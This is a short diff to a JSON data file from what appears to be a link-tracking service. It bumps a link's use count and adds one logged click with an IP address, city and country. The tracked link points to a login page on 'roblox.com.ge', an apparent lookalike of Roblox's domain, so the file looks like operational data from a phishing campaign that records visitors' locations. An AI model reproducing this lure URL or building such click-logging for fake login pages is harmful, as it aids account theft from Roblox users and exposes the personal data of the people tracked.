@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 819,
+    "useCount": 820,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6664,6 +6664,14 @@
         "city": "Belo Horizonte",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777172325820,
+        "ip": "186.7.231.174",
+        "country": "Dominican Republic",
+        "city": "Santo Domingo",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
